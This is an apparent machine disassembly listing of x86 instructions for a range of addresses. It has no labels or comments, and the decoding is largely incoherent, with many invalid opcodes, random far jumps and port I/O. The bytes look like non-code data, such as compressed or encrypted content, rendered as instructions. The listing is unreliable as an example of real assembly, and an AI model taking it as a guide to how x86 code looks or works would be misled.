  420146:	sub    DWORD PTR [ebx-0x2e4cfcdf],edi
  42014c:	add    al,BYTE PTR [edx-0x52]
  42014f:	sub    eax,0xaa391b4e
  420154:	retf   
  420155:	xchg   edx,eax
  420156:	push   ecx
  420157:	(bad)  
  420158:	scas   eax,DWORD PTR es:[edi]
  420159:	ret    0xc85f
  42015c:	in     al,dx
  42015d:	mov    al,0x7
  42015f:	xlat   BYTE PTR ds:[ebx]
  420160:	add    eax,0x253b9d93
  420165:	mov    bl,0x62
  420167:	mov    bh,0xe3
  420169:	mov    ecx,0xfd067073
  42016e:	(bad)  [eax-0x6cd06a2e]
  420174:	ja     0x420156
  420176:	dec    esi
  420178:	aad    0xdb
  42017a:	inc    esp
  42017b:	mov    DWORD PTR [edi],edx
  42017d:	fild   DWORD PTR [eax]
	...
  420187:	add    BYTE PTR [eax],al
  420189:	add    BYTE PTR [ecx+0x57],bl
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx-0x7a],esi
  420197:	jns    0x4201e8
  420199:	ffreep st(4)
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	jl     0x4201a6
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	inc    edx
  4201a3:	jecxz  0x42021c
  4201a5:	fisub  DWORD PTR [edx+0x1a6d5796]
  4201ab:	mov    ah,0xdc
  4201ad:	jmp    0x5ca7:0xe31f4ae0
  4201b4:	popf   
  4201b5:	in     al,0x18
  4201b7:	add    BYTE PTR [eax],0xde
  4201ba:	lods   al,BYTE PTR ds:[esi]
  4201bb:	ficom  DWORD PTR [ebx+0x685e7c3]
  4201c1:	push   0x78
  4201c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201c4:	dec    esi
  4201c5:	jno    0x420171
  4201c7:	cmp    eax,0x537f2f5b
  4201cc:	mov    es,WORD PTR [ebp+0x87af73d]
  4201d2:	(bad)  [edi]
  4201d4:	shr    BYTE PTR [esi],1
  4201d6:	inc    esp
  4201d7:	test   eax,0xf26f23d7
  4201dc:	mov    edx,0xbf8cad2a
  4201e1:	push   ss
  4201e2:	xchg   BYTE PTR [ecx],bh
  4201e4:	ret    0x2a15
  4201e7:	mov    esp,0xa1e54345
  4201ec:	and    bh,dh
  4201ee:	jb     0x420266
  4201f0:	popf   
  4201f1:	mov    eax,ds:0x53594fcb
  4201f6:	jns    0x4201bd
  4201f8:	xor    cl,al
  4201fa:	jecxz  0x420200
  4201fc:	jmp    0x89d6:0x7c31e17b
  420203:	fsub   DWORD PTR [esi]
  420205:	fdiv   QWORD PTR [eax+0x393d6941]
  42020b:	aad    0x4d
  42020d:	(bad)  
  42020e:	stos   DWORD PTR es:[edi],eax
  42020f:	popa   
  420210:	cs dec ecx
  420212:	ret    
  420213:	push   eax
  420214:	pop    esp
  420215:	aaa    
  420216:	xchg   esi,eax
  420217:	mov    dl,0x9e
  420219:	inc    eax
  42021a:	mov    ebx,ebx
  42021c:	ins    BYTE PTR es:[edi],dx
  42021d:	cld    
  42021e:	mov    ds:0x30f35e59,al
  420223:	add    esp,DWORD PTR [edx-0x74]
  420226:	adc    ebx,eax
  420228:	jnp    0x42026f
  42022a:	retf   
  42022b:	add    DWORD PTR ds:0x697adbd5,ecx
  420231:	mov    edi,0xb76e9788
  420236:	dec    edi
  420237:	jae    0x420209
  420239:	test   al,0x6a
  42023b:	cmp    ebx,DWORD PTR [edx]
  42023d:	in     eax,dx
  42023e:	out    0xe8,al
  420240:	gs ret 0x8fa3
  420244:	aad    0xfa
  420246:	cld    
  420247:	dec    BYTE PTR [ebp+0x56a5dd19]
  42024d:	sub    esi,ebx
  42024f:	cs fs add al,0x8c
  420253:	jbe    0x4202a5
  420255:	loope  0x42028a
  420257:	or     esp,esi
  420259:	shr    DWORD PTR [ecx],0x42
  42025c:	(bad)  
  42025d:	arpl   cx,bp
  42025f:	pop    ebp
  420260:	mov    ds:0x49e56e61,al
  420265:	push   0x18d75006
  42026a:	jp     0x420255
  42026c:	pop    ss
  42026d:	jmp    0x4202a1
  42026f:	mov    dl,0x24
  420271:	pop    es
  420272:	mov    edx,0xa6d1e19a
  420277:	push   ebx
  420278:	jle    0x420215
  42027a:	xor    al,0xf3
  42027c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42027d:	xor    BYTE PTR [eax-0x31],cl
  420280:	mov    ecx,0xb18e1a54
  420285:	sub    al,0x51
  420287:	daa    
  420288:	or     dl,ch
  42028a:	sub    eax,ecx
  42028c:	bts    DWORD PTR [ecx+0x60da3ffe],ebx
  420293:	adc    al,BYTE PTR [ebp-0x3f]
  420296:	(bad)  
  420297:	out    dx,eax
  420298:	call   0x4afd:0xbc3cbd91
  42029f:	push   es
  4202a0:	js     0x4202f7
  4202a2:	call   0x6480c789
  4202a7:	fisub  DWORD PTR [esi+0x4255b2ad]
  4202ad:	cdq    
  4202ae:	sti    
  4202af:	push   edi
  4202b0:	sar    BYTE PTR [eax-0x34ba8112],cl
  4202b6:	and    eax,0x535c47bb
  4202bb:	mov    esi,0x60d949fa
  4202c0:	call   0xc0ee:0x8c55eccc
  4202c7:	xor    DWORD PTR [edx+0x768a690b],edx
  4202cd:	pop    ecx
  4202ce:	jp     0x4202c6
  4202d0:	inc    eax
  4202d1:	in     eax,0xb4
  4202d3:	add    dl,BYTE PTR [eax-0x37b0afc1]
  4202d9:	jns    0x4202fc
  4202db:	or     BYTE PTR [ecx-0x42],dh
  4202de:	out    dx,al
  4202df:	or     bl,bl
  4202e1:	dec    edx
  4202e2:	dec    ebx
  4202e3:	outs   dx,BYTE PTR ds:[esi]
  4202e4:	jmp    0x42033b
  4202e6:	inc    ebp
  4202e7:	adc    DWORD PTR [ebx],0xffffffc9
  4202ea:	or     edx,esi
  4202ec:	call   0xf0b3fb4
  4202f1:	call   0xbe6a:0x1eb9a542
  4202f8:	in     eax,dx
  4202f9:	mov    ebx,gs
  4202fb:	ror    DWORD PTR [edi+0x72fcf8de],1
  420301:	mov    ebx,0xa34e9f8a
  420306:	outs   dx,BYTE PTR ds:[esi]
  420307:	add    BYTE PTR [esi+0x255dfbe1],bh
  42030d:	loopne 0x420308
  42030f:	je     0x4202ee
  420311:	mov    esp,0xc6f85600
  420316:	cmp    bl,BYTE PTR [ebp+0x13]
  420319:	in     al,0xec
  42031b:	into   
  42031c:	inc    ebp
  42031d:	int3   
  42031e:	mov    al,0x47
  420320:	pop    eax
  420321:	scas   eax,DWORD PTR es:[edi]
  420322:	pop    eax
  420323:	(bad)  
  420324:	fcom   QWORD PTR [ebx+edx*8-0x79]
  420328:	(bad)  
  420329:	sub    eax,0x7dd450c5
  42032e:	jne    0x42035d
  420330:	jle    0x420374
  420332:	ins    DWORD PTR es:[edi],dx
  420333:	add    DWORD PTR [eax+0x3b],edi
  420336:	sahf   
  420337:	push   0x131dc89a
  42033c:	pop    esi
  42033d:	daa    
  42033e:	in     eax,0xd
  420340:	mov    BYTE PTR ds:0xbd39e923,bh
  420346:	nop
  420347:	dec    ebx
  420348:	jns    0x420382
  42034a:	xor    dh,BYTE PTR [ebx+0x6332fc05]
  420350:	nop
  420351:	xor    BYTE PTR [ebx-0x52],0xa5
  420355:	xchg   bh,bl
  420357:	adc    ah,bl
  420359:	pop    edx
  42035a:	push   ss
  42035b:	mov    ebx,0xd862c19e
  420360:	call   0x82dc:0x6dd9c3af
  420367:	jbe    0x42032f
  420369:	mov    ch,0x77
  42036b:	into   
  42036c:	out    dx,eax
  42036d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42036e:	inc    esi
  42036f:	sub    cl,BYTE PTR [ecx+ebx*8+0x4e]
  420373:	cmc    
  420374:	or     BYTE PTR [ebp-0x6680c545],cl
  42037a:	fucom  st(6)
  42037c:	adc    BYTE PTR [ebx+0x62d645c],0xd0
  420383:	inc    eax
  420384:	cli    
  420385:	push   ds
  420386:	test   eax,0xba70c4ec
  42038b:	cmp    ebx,edi
  42038d:	mov    eax,0xaa793811
  420392:	popa   
  420393:	loop   0x420333
  420395:	ret    0xffdc
  420398:	es out dx,eax
  42039a:	(bad)  
  42039b:	cmp    ebp,eax
  42039d:	es jno 0x4203fe
  4203a0:	test   al,0x49
  4203a3:	and    ah,al
  4203a5:	add    eax,0x2cf98af4
  4203aa:	stc    
  4203ab:	ror    al,1
  4203ad:	loop   0x4203a3
  4203af:	dec    ebp
  4203b0:	ret    0x8280
  4203b3:	cmp    bx,WORD PTR [esi+eax*2]
  4203b7:	(bad)  
  4203b8:	stc    
  4203b9:	push   ebx
  4203ba:	retf   
  4203bb:	push   ds
  4203bc:	test   BYTE PTR [ebp-0x78],ah
  4203bf:	push   esi
  4203c0:	cmp    BYTE PTR [ebp+0x28363daa],0x45
  4203c7:	push   ebp
  4203c8:	jns    0x4203de
  4203ca:	sub    DWORD PTR [eax-0x12],esp
  4203cd:	cdq    
  4203ce:	cli    
  4203cf:	fcmovne st,st(3)
  4203d1:	push   ebx
  4203d2:	mov    ebx,0xbeb3dd6d
  4203d7:	aas    
  4203d8:	mov    bl,BYTE PTR [ecx]
  4203da:	comiss xmm1,DWORD PTR [ecx]
  4203dd:	std    
  4203de:	hlt    
  4203df:	jge    0x4203d8
  4203e1:	inc    ebx
  4203e2:	push   ecx
  4203e3:	jno    0x4203e6
  4203e5:	outs   dx,BYTE PTR ds:[esi]
  4203e6:	ins    BYTE PTR es:[edi],dx
  4203e7:	aaa    
  4203e8:	call   0x831d156b
  4203ed:	stos   BYTE PTR es:[edi],al
  4203ee:	pop    ebp
  4203ef:	sbb    ah,BYTE PTR [edi]
  4203f1:	xchg   ecx,eax
  4203f2:	mov    edi,0xdc204706
  4203f7:	mov    dl,0xf6
  4203f9:	or     BYTE PTR [ecx],ch
  4203fb:	jle    0x4203ef
  4203fd:	mov    ds:0x913a03bf,al
  420402:	cmc    
  420403:	xchg   esp,eax
  420404:	ret    0xc49
  420407:	pusha  
  420408:	or     BYTE PTR [ecx-0x11ea8f9b],dh
  42040e:	sbb    bh,BYTE PTR [edi]
  420410:	int3   
  420411:	inc    edi
  420412:	imul   ebx,eax,0x20e05a70
  420418:	mov    eax,0x940389e8
  42041d:	test   BYTE PTR [ecx+ebx*8],dl
  420420:	mov    dl,0xb2
  420422:	inc    edi
  420423:	sbb    esp,ebx
  420425:	fmulp  st(0),st
  420427:	xchg   ebp,eax
  420428:	mov    al,0xa4
  42042a:	test   al,0x74
  42042c:	aas    
  42042d:	jge    0x4203f8
  42042f:	(bad)  
  420430:	es add ah,ah
  420433:	lea    ebx,[edi*2-0x6e5f3c1f]
  42043a:	mov    ah,0x79
  42043c:	hlt    
  42043d:	int3   
  42043e:	cmp    cl,BYTE PTR [edi+0x43c1a4b9]
  420444:	adc    eax,0xa886e1da
  420449:	aad    0xe1
  42044b:	sub    DWORD PTR [edi-0x71],esi
  42044e:	mov    dh,0x92
  420450:	nop
  420451:	and    eax,0x77c30c4e
  420456:	sbb    ecx,edi
  420458:	dec    esp
  420459:	mov    bl,0xba
  42045b:	sub    esi,esp
  42045d:	es lock out 0xd4,al
  420461:	js     0x420469
  420463:	popf   
  420464:	xor    DWORD PTR [ebp+0xc13a6b7],edi
  42046a:	cmp    BYTE PTR [edx],0xb0
  42046d:	mov    ah,BYTE PTR [edi]
  42046f:	inc    esp
  420470:	stos   DWORD PTR es:[edi],eax
  420471:	sahf   
  420472:	loopne 0x42047a
  420474:	jge    0x420476
  420476:	mov    edi,0x7e6a9914
  42047b:	mov    ah,0x9a
  42047d:	pop    ecx
  42047e:	stc    
  42047f:	jmp    0xa5be:0x793d5e0c
  420486:	shl    DWORD PTR [ebp-0x20563094],1
  42048c:	fcmovu st,st(5)
  42048e:	loopne 0x420442
  420490:	jmp    0x4bce:0x8b1b72a1
  420497:	add    al,0xfe
  420499:	lahf   
  42049a:	jg     0x420474
  42049c:	or     DWORD PTR ss:[esi],ecx
  42049f:	jb     0x42042a
  4204a1:	(bad)  
  4204a2:	dec    eax
  4204a3:	out    dx,eax
  4204a4:	dec    esi
  4204a5:	std    
  4204a6:	xlat   BYTE PTR ds:[ebx]
  4204a7:	inc    edi
  4204a8:	ret    0xc017
  4204ab:	jno    0x42044d
  4204ad:	cwde   
  4204ae:	mov    dh,0xcb
  4204b0:	mov    esi,0x6bb971f9
  4204b6:	jp     0x420494
  4204b8:	sbb    ah,BYTE PTR [edi]
  4204ba:	lods   eax,DWORD PTR ds:[esi]
  4204bb:	loop   0x4204e9
  4204bd:	(bad)  
  4204be:	mov    ah,0xff
  4204c0:	and    ecx,DWORD PTR [ecx+esi*8]
  4204c3:	jp     0x4204f8
  4204c5:	aas    
  4204c6:	mov    eax,ds:0x36b557f5
  4204cb:	mov    ebx,0x49b93cba
  4204d0:	fwait
  4204d1:	xchg   ebx,eax
  4204d2:	dec    edi
  4204d3:	inc    eax
  4204d5:	aam    0xe4
  4204d7:	or     ebp,DWORD PTR [eax+0x687bfe38]
  4204dd:	mov    dh,0x1c
  4204df:	xchg   esp,eax
  4204e0:	retf   
  4204e1:	scas   eax,DWORD PTR es:[edi]
  4204e2:	pop    ebx
  4204e3:	imul   eax,DWORD PTR [edx+0x4be9e01d],0x47
  4204ea:	and    eax,edi
  4204ec:	(bad)  
  4204ed:	in     eax,dx
  4204ee:	stos   BYTE PTR es:[edi],al
  4204ef:	add    DWORD PTR [ebx-0x34],edi
  4204f2:	pusha  
  4204f3:	outs   dx,BYTE PTR ds:[esi]
  4204f4:	aad    0x79
  4204f6:	mov    ebp,0x7aedebdc
  4204fb:	out    0x3c,eax
  4204fd:	std    
  4204fe:	mov    al,ds:0x522cc07f
  420503:	mov    ds:0x142bb75a,eax
  420508:	test   al,0xe1
  42050a:	or     BYTE PTR [ebp-0x5bc1731],dh
  420510:	dec    DWORD PTR [esi-0x70e5f7c3]
  420516:	jae    0x420594
  420518:	jl     0x4204ce
  42051a:	ins    BYTE PTR es:[edi],dx
  42051b:	cmp    dh,BYTE PTR [ebx+eax*4+0x52]
  42051f:	xor    DWORD PTR [eax+eiz*8],esp
  420522:	sahf   
  420523:	mov    ch,0x58
  420525:	popf   
  420526:	xlat   BYTE PTR ds:[ebx]
  420527:	push   es
  420528:	call   0x5a38551a
  42052d:	in     eax,dx
  42052e:	stos   DWORD PTR es:[edi],eax
  42052f:	mov    ah,0x9d
  420531:	fild   DWORD PTR [edx+0x3e]
  420534:	mov    WORD PTR [esi-0x33],ds
  420537:	dec    edx
  420538:	js     0x4204f4
  42053a:	add    esi,ebx
  42053c:	push   ebx
  42053d:	mov    cl,0x57
  42053f:	pop    edx
  420540:	retf   0x197d
  420543:	(bad)  [esi-0x4d7a2719]
  420549:	pop    eax
  42054a:	inc    ebp
  42054b:	stos   DWORD PTR es:[edi],eax
  42054c:	sub    al,0xb
  42054e:	pop    eax
  42054f:	push   esp
  420550:	mov    eax,ds:0xd6d4d416
  420555:	loop   0x4205c5
  420557:	repz push esp
  420559:	cs mov ebp,0xe67540d4
  42055f:	iret   
  420560:	(bad)  
  420562:	das    
  420563:	leave  
  420564:	sbb    esp,DWORD PTR [ebx+ebp*1]
  420567:	clc    
  420568:	(bad)  
  420569:	loop   0x4205a8
  42056b:	ins    DWORD PTR es:[edi],dx
  42056c:	cmp    DWORD PTR ds:0x2db12819,esi
  420572:	in     al,dx
  420573:	add    eax,edx
  420575:	dec    esp
  420576:	cmp    dl,bl
  420578:	cmp    edi,0x63
  42057b:	push   edx
  42057c:	outs   dx,BYTE PTR ds:[esi]
  42057d:	inc    edi
  42057e:	js     0x420509
  420580:	in     al,0x6f
  420582:	loope  0x4205de
  420584:	xchg   edi,eax
  420585:	out    0xaa,al
  420587:	mov    ch,0x6f
  420589:	adc    esp,DWORD PTR [esi+0xf0c21d9]
  42058f:	sar    BYTE PTR [eax+0x34e694a1],1
  420595:	fimul  WORD PTR [edx-0x19]
  420598:	xor    al,BYTE PTR [esi-0x19]
  42059b:	pop    eax
  42059c:	ret    
  42059d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42059e:	hlt    
  42059f:	out    0xd9,eax
  4205a1:	outs   dx,DWORD PTR ds:[esi]
  4205a2:	dec    ebp
  4205a3:	or     DWORD PTR [edi+0x42f0a253],edx
  4205a9:	sbb    esp,DWORD PTR [esi]
  4205ab:	jmp    0xa2c1:0x977101ea
  4205b2:	sub    al,0x73
  4205b4:	sub    ah,dl
  4205b6:	sbb    esp,esi
  4205b8:	retf   0x1fdc
  4205bb:	outs   dx,DWORD PTR ds:[esi]
  4205bc:	mov    eax,0xe5dea5fa
  4205c1:	mov    ebx,0x4e4bca5f
  4205c6:	lahf   
  4205c7:	lds    esp,FWORD PTR [ecx+edx*2-0x36]
  4205cb:	ret    
  4205cc:	bound  ecx,QWORD PTR [edi-0x6f]
  4205cf:	fcomp  QWORD PTR [ebx+0x16]
  4205d2:	inc    ecx
  4205d3:	data16 sbb BYTE PTR [edi],cl
  4205d6:	sbb    eax,0xd9133f14
  4205db:	inc    edi
  4205dc:	and    ah,BYTE PTR [ecx+0x4dce7b5]
  4205e2:	mov    edx,0xd1464cdd
  4205e7:	outs   dx,BYTE PTR ds:[esi]
  4205e8:	imul   BYTE PTR [ecx]
  4205ea:	inc    edx
  4205eb:	sub    dl,bl
  4205ed:	ins    BYTE PTR es:[edi],dx
  4205ee:	sub    dh,BYTE PTR [esi]
  4205f0:	mov    WORD PTR [ebp+0x68],?
  4205f3:	scas   eax,DWORD PTR es:[edi]
  4205f4:	cmp    eax,0xa3df02f8
  4205f9:	and    BYTE PTR [ebx-0x39],ch
  4205fc:	jmp    0xae4d:0xb18453d7
  420603:	xor    al,0x98
  420605:	pop    ebp
  420606:	imul   edx,DWORD PTR [eax+edx*1+0x7d67acaf],0x43d7b015
  420611:	mov    ecx,0xebf44078
  420616:	imul   edx,DWORD PTR [esi-0x72],0x5fb8ea83
  42061d:	in     eax,dx
  42061e:	hlt    
  42061f:	xchg   DWORD PTR [ebx+0x3d1dc229],ebp
  420625:	pop    es
  420626:	dec    ecx
  420627:	sub    eax,0xc3410a3e
  42062c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42062d:	rol    DWORD PTR [ecx-0x12],0x95
  420631:	mov    eax,esp
  420633:	pop    ss
  420634:	adc    al,cl
  420636:	std    
  420637:	push   ebp
  420638:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42063a:	pop    ebx
  42063b:	out    dx,eax
  42063c:	sbb    esi,DWORD PTR [edx+0x64df83c]
  420642:	xchg   esp,eax
  420643:	mov    esp,0x92b20007
  420648:	xor    dh,0xab
  42064b:	xchg   ecx,eax
  42064c:	jb     0x42068b
  42064e:	std    
  42064f:	data16 js 0x4206c1
  420652:	jle    0x420653
  420654:	addr16 (bad) 
  420656:	dec    esp
  420657:	fist   WORD PTR [ebp-0x5]
  42065a:	dec    esi
  42065b:	fisub  WORD PTR [ebp+0x64977d22]
  420661:	test   edi,ecx
  420663:	mov    BYTE PTR ss:[eax+0x5f],0xa4
  420668:	or     ah,BYTE PTR [ebx]
  42066a:	or     eax,0xb04ed232
  42066f:	and    esi,edi
  420671:	ds pop es
  420673:	loope  0x42069b
  420675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420676:	jnp    0x42060a
  420678:	int    0xaf
  42067a:	clc    
  42067b:	add    dh,BYTE PTR [esi]
  42067d:	and    eax,0xbad3cd8d
  420682:	xchg   ecx,eax
  420683:	sti    
  420684:	mov    ebx,0xaee99faf
  420689:	push   ebx
  42068a:	pop    esp
  42068b:	adc    ah,BYTE PTR [edi-0x7b]
  42068e:	ret    
  42068f:	cmc    
  420690:	jns    0x420632
  420692:	add    ecx,DWORD PTR [ebp+0x20]
  420695:	lock sub eax,0xd8c4285d
  42069b:	pop    eax
  42069c:	pop    ebx
  42069d:	mov    edx,edx
  42069f:	add    BYTE PTR [esi+0x7b],0xe1
  4206a3:	test   bh,ch
  4206a5:	or     ch,BYTE PTR [edi]
  4206a7:	add    BYTE PTR [ecx],al
  4206a9:	loop   0x420647
  4206ab:	mov    ah,0x1a
  4206ad:	(bad)  
  4206ae:	and    esi,DWORD PTR [ebp+0x4ce07743]
  4206b4:	cmc    
  4206b5:	ins    DWORD PTR es:[edi],dx
  4206b6:	mov    al,ds:0x74057e6b
  4206bb:	or     eax,esi
  4206bd:	fistp  DWORD PTR [ecx+0x3532aea9]
  4206c3:	mov    ch,0x96
  4206c5:	mov    esi,0xc9dfde16
  4206ca:	retf   0x35ba
  4206cd:	icebp  
  4206ce:	ins    BYTE PTR es:[edi],dx
  4206cf:	dec    esp
  4206d0:	inc    esp
  4206d1:	mov    edi,0xb33f727f
  4206d6:	pusha  
  4206d7:	jmp    0xe557:0xdcbfe54c
  4206de:	in     al,dx
  4206df:	mov    ebx,0x26f37623
  4206e4:	and    eax,0xdc14ecc4
  4206e9:	pop    ds
  4206ea:	mov    ebp,DWORD PTR [esi]
  4206ec:	mov    edx,0xa49bfc59
  4206f1:	pushf  
  4206f2:	push   es
  4206f3:	sub    al,0xe7
  4206f5:	xor    eax,0x81a040bd
  4206fa:	aaa    
  4206fb:	sbb    edx,DWORD PTR [ecx-0x1ba49b74]
  420701:	mov    ch,0x88
  420703:	mov    ebp,0x8db28f57
  420708:	mov    ?,WORD PTR [ecx]
  42070a:	mov    ds:0x2de85a8,al
  42070f:	adc    DWORD PTR [eax-0x7281687],ecx
  420715:	dec    ebx
  420716:	or     eax,0x80b63fa8
  42071b:	rcl    edi,1
  42071d:	sbb    DWORD PTR [esi],0xffffff84
  420720:	xchg   BYTE PTR [ebx+edi*4+0x63],bl
  420724:	mov    ecx,0x805e39c1
  420729:	jge    0x420738
  42072b:	jo     0x420754
  42072d:	xchg   esi,eax
  42072e:	sbb    ebp,ecx
  420730:	pop    es
  420731:	xor    al,0x79
  420733:	ss sub al,0x53
  420736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420737:	in     al,0xac
  420739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42073a:	mov    WORD PTR [eax+0x45e9fe6a],ds
  420740:	fimul  WORD PTR [ebx-0x5b]
  420743:	mov    BYTE PTR [ebp+edx*4+0x769c62d0],dh
  42074a:	push   0x71
  42074c:	xor    ecx,edx
  42074e:	es mov ebx,0x69b94fac
  420754:	ss inc si
  420757:	mov    ebx,0xea7d70e5
  42075c:	ffree  st(5)
  42075e:	inc    eax
  42075f:	pop    ecx
  420760:	or     DWORD PTR [edx+eiz*8],ebx
  420763:	pop    edx
  420764:	lahf   
  420765:	jmp    0x1b01b0e7
  42076a:	pop    ecx
  42076b:	mov    al,ds:0xe98db07
  420770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420771:	xor    dh,BYTE PTR [eax]
  420773:	mov    eax,0xa5012a9d
  420778:	sbb    BYTE PTR [edx+0x4d],ah
  42077b:	sbb    BYTE PTR [ebx+0xb],dl
  42077e:	(bad)  
  42077f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420780:	jne    0x42077f
  420782:	jl     0x4207de
  420784:	test   DWORD PTR [eax+0x536bf9c1],ebx
  42078a:	leave  
  42078b:	sbb    bh,BYTE PTR [ecx]
  42078d:	mov    eax,ds:0x78f98d40
  420792:	in     eax,0xc
  420794:	jns    0x42074b
  420796:	and    BYTE PTR [ecx-0x59],bh
  420799:	sbb    eax,0x918835d3
  42079e:	das    
  42079f:	loop   0x420779
  4207a1:	inc    edx
  4207a2:	retf   
  4207a3:	cwde   
  4207a4:	fnstsw WORD PTR [eax]
  4207a6:	pop    edx
  4207a7:	cld    
  4207a8:	addr16 mov dl,0x6a
  4207ab:	(bad)  
  4207ac:	xor    ecx,DWORD PTR [ecx+0x79c77815]
  4207b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207b3:	xor    al,0x30
  4207b5:	lods   eax,DWORD PTR ds:[esi]
  4207b6:	mov    al,dl
  4207b8:	and    ah,bh
  4207ba:	mov    BYTE PTR [edi+0x45a9b1f9],dh
  4207c0:	sub    ch,BYTE PTR [ebp+edi*8-0x3e755def]
  4207c7:	bound  edx,QWORD PTR [edi+0x5d9213d3]
  4207cd:	rcr    bh,cl
  4207cf:	cli    
  4207d0:	xchg   edi,eax
  4207d1:	aaa    
  4207d2:	hlt    
  4207d3:	out    dx,eax
  4207d4:	inc    ecx
  4207d5:	or     eax,0xd1cd0052
  4207da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207db:	cmc    
  4207dc:	jg     0x4207fc
  4207de:	sti    
  4207df:	cmp    bl,dl
  4207e1:	(bad)  
  4207e2:	push   ebx
  4207e3:	jmp    0x42078b
  4207e5:	lods   eax,DWORD PTR ds:[esi]
  4207e6:	inc    edi
  4207e7:	popf   
  4207e8:	enter  0xb5ef,0xee
  4207ec:	fdivrp st(5),st
  4207ee:	imul   esp,DWORD PTR [eax-0xd],0xffffff81
  4207f2:	loopne 0x4207b1
  4207f4:	addr16 aam 0x5b
  4207f7:	push   edx
  4207f8:	cld    
  4207f9:	add    cl,BYTE PTR [edx]
  4207fb:	push   ebp
  4207fc:	int3   
  4207fd:	cs pop edi
  4207ff:	cmp    BYTE PTR [eax+0x4568d0a5],dl
  420805:	(bad)  
  420807:	xchg   edx,eax
  420808:	adc    eax,0xffffffde
  42080b:	inc    ebp
  42080c:	pop    ebx
  42080d:	mov    al,ds:0xe387375c
  420812:	loop   0x420853
  420814:	sub    eax,0x46714c7e
  420819:	push   edx
  42081a:	mov    bh,0xf2
  42081c:	fs enter 0x0,0x0
	...
  420829:	add    BYTE PTR [ebp+ecx*2+0x4a],al
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0xc304921e
  420837:	dec    BYTE PTR [edi]
  420839:	aas    
  42083a:	inc    eax
  42083b:	xchg   edi,eax
  42083c:	add    DWORD PTR [eax],eax
  42083e:	jl     0x420846
  420840:	add    BYTE PTR [eax],al
  420842:	jae    0x4208b8
  420844:	mov    ds:0x13e1aa5b,al
  420849:	mov    bl,0xa
  42084b:	pop    ss
  42084c:	adc    ecx,DWORD PTR [ecx]
  42084e:	cmp    eax,0x2f09f5a6
  420853:	bound  edi,QWORD PTR [eax-0x69]
  420856:	add    dl,bh
  420858:	add    ch,bh
  42085a:	jns    0x420813
  42085c:	mov    cl,0x5
  42085e:	jmp    esi
  420860:	xchg   esp,eax
  420861:	pop    esi
  420862:	add    BYTE PTR [esi+eiz*4-0x70e8c0d1],al
  420869:	push   ss
  42086a:	and    al,0x5b
  42086c:	repz imul esp,DWORD PTR [eax+0x78],0xc27e3d1
  420874:	lods   eax,DWORD PTR ds:[esi]
  420875:	jecxz  0x420823
  420877:	bswap  esp
  420879:	enter  0xf3b8,0x7d
  42087d:	cmp    bl,BYTE PTR [ecx-0x66]
  420880:	pop    DWORD PTR [edi+0x40f45333]
  420886:	mov    DWORD PTR [edx+edx*2],esp
  420889:	dec    edi
  42088a:	pop    ss
  42088b:	test   DWORD PTR [eax+0x55adb4c2],0x632bd55a
  420895:	imul   BYTE PTR [ecx+0x162ac975]
  42089b:	xchg   DWORD PTR [ebp-0x176f98a6],eax
  4208a1:	pop    ds
  4208a2:	jo     0x42083f
  4208a4:	jmp    0x144c:0x8b2c9ebe
  4208ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208ac:	mov    edi,0xe3deaf7d
  4208b1:	and    BYTE PTR [esi],al
  4208b3:	push   ebp
  4208b4:	jne    0x420902
  4208b6:	(bad)  
  4208b7:	imul   esp,DWORD PTR ds:0xba64c3ba,0xffffffca
  4208be:	jnp    0x4208f8
  4208c0:	xchg   edx,eax
  4208c1:	(bad)  
  4208c2:	sbb    al,0x3
  4208c4:	retf   0xa932
  4208c7:	mov    dl,0xc1
  4208c9:	mov    bl,0x56
  4208cb:	loope  0x42089a
  4208cd:	jnp    0x4208f0
  4208cf:	sub    esi,eax
  4208d1:	and    eax,0xf8cc673d
  4208d6:	push   edx
  4208d7:	sbb    eax,0xcb983a16
  4208dc:	cld    
  4208dd:	in     eax,dx
  4208de:	hlt    
  4208df:	scas   al,BYTE PTR es:[edi]
  4208e0:	mov    bh,BYTE PTR cs:[esi-0x5a0bcb8f]
  4208e7:	jmp    0xcf17:0xf2c18b5b
  4208ee:	xchg   esi,eax
  4208ef:	mov    ah,0x8d
  4208f1:	mov    al,ds:0x52208208
  4208f6:	in     eax,0x72
  4208f8:	jns    0x42089c
  4208fa:	xor    esi,ebx
  4208fc:	cld    
  4208fd:	jnp    0x4208a9
  4208ff:	pop    ecx
  420900:	cmp    DWORD PTR [ecx+0x6a],ebx
  420903:	out    dx,eax
  420904:	dec    esp
  420905:	jmp    0xb775:0xe9dbdd13
  42090c:	mov    al,0x4b
  42090e:	(bad)  
  42090f:	dec    edi
  420910:	mov    cl,BYTE PTR ds:0xbb338a66
  420916:	test   DWORD PTR [esi],ecx
  420918:	xor    bl,BYTE PTR [edi-0xe]
  42091b:	xor    ebp,esi
  42091d:	and    BYTE PTR [ebx+0x746f04b1],0xe2
  420924:	mov    edx,0xea4eb8d
  420929:	nop
  42092a:	push   ds
  42092b:	sbb    BYTE PTR [edi-0x20f6372e],0x50
  420932:	xor    DWORD PTR [esi+ebp*1],esi
  420935:	scas   eax,DWORD PTR es:[edi]
  420936:	test   eax,0xb60cea90
  42093b:	mov    ds:0xaaef9eae,al
  420940:	add    DWORD PTR [esi+0x6208360f],esi
  420946:	popf   
  420947:	scas   eax,DWORD PTR es:[edi]
